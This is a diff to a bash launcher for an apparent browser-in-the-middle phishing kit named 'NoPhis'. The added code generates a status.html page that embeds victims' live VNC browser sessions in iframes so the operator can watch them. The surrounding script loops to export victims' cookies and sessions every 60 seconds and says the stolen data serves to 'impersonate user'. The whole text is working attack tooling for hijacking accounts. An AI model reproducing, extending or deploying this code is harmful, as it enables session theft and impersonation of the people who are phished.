@@ -106,6 +106,62 @@ case "$1" in
 	fi
 	 
         printf "[+] Configuration file generated \n" 
+        
+        htmlpath="./output/status.html"
+        if [ -e $htmlpath ]
+        then
+        	rm -rf $htmlpath
+        fi
+        
+        echo '
+	<!DOCTYPE html>
+	<html>
+	<head>
+	  <title>NoPhis status</title>
+	  <style>
+	    body {
+	      background-color: rgb(9, 25, 75); /* Set the background to black */
+	      margin: 0; /* Reset default body margin */
+	      padding: 0; /* Reset default body padding */
+	    }
+
+	    #container {
+	      background-color: rgb(56, 74, 99);
+	      width: 100vh; /* Set equal width and height */
+	      height: 50vh;
+	      border-radius: 10px; /* Add rounded corners */
+	      overflow: hidden; /* Hide the scrollbars */
+	      display: flex; /* Use flexbox */
+	      align-items: center; /* Vertically center the content */
+	      justify-content: center; /* Horizontally center the content */
+	      margin: 20px auto; /* Center the container */
+	      position: relative; /* Create a context for absolute positioning */
+	    }
+
+	    #scaled-iframe {
+	      width: 100%;
+	      height: 100%;
+	      transform: scale(0.9);
+	      transform-origin: middle;
+	    }
+
+	    #button {
+	      background-color: orange;
+	      color: white;
+	      border: none;
+	      border-radius: 5px;
+	      padding: 10px 40px;
+	      font-size: 16px;
+	      cursor: pointer;
+	      margin-right: 35px; /* Adjust the margin-left as per your preference */
+	      text-decoration: none; /* Remove underline */
+	      white-space: nowrap;
+	    }
+	  </style>
+	</head>
+	<body>
+	' > ./output/status.html
+        
 	declare -a urls=()
 	printf "[-] Starting containers \033[0K\r\n"  
 	for (( c=$START; c<=$END; c++ ))
@@ -148,12 +204,27 @@ case "$1" in
 	    
 	if [ -n "$SSL" ]
 	then
+		echo "
+		  <div id='container'>
+    		    <iframe id='scaled-iframe' src='https://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true'></iframe>
+    		    <a href='https://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true' id='button'>View Session</a>
+  		  </div>
+		" >> ./output/status.html
 		urls+=("https://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote")
 	else
+		echo "
+		  <div id='container'>
+    		    <iframe id='scaled-iframe' src='http://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true'></iframe>
+    		    <a href='http://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true' id='button'>View Session $c</a>
+  		  </div>
+		" >> ./output/status.html
 		urls+=("http://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote")
 	fi
 	done
-
+	echo "
+	</body>
+	</html>
+        " >> ./output/status.html
 	echo "</VirtualHost>" >> ./proxy/000-default.conf
         printf "[+] VNC Containers started                          \n"  
         printf "[-] Starting reverse proxy \033[0K\r\n"  
@@ -187,7 +258,15 @@ case "$1" in
 		echo $value
 	done
 	
+	dbpath="./output/phis.db"
+
+        if [ -e $dbpath ]
+        then
+        	rm -rf $dbpath
+        fi
+	
 	printf "[-] Starting Loop to collect sessions and cookies from containers\n" 
+	printf "[+] You can check and view the open session by use of the status.html in the output directory\n" 
 	#Start a loop which copies the cookies from the containers
 	printf "    Every 60 Seconds Cookies and Sessions are exported - Press [CTRL+C] to stop..\n"
 	trap 'printf "\n[-] Import stealed session and cookie JSON or the firefox profile to impersonate user\n"; printf "[-] VNC and Rev-Proxy container will be removed\n" ; sleep 2 ; sudo docker rm -f $(sudo docker ps --filter=name="vnc-*" -q) &> /dev/null && sudo docker rm -f $(sudo docker ps --filter=name="rev-proxy" -q) &> /dev/null & printf "[+] Done!"; sleep 2' SIGTERM EXIT
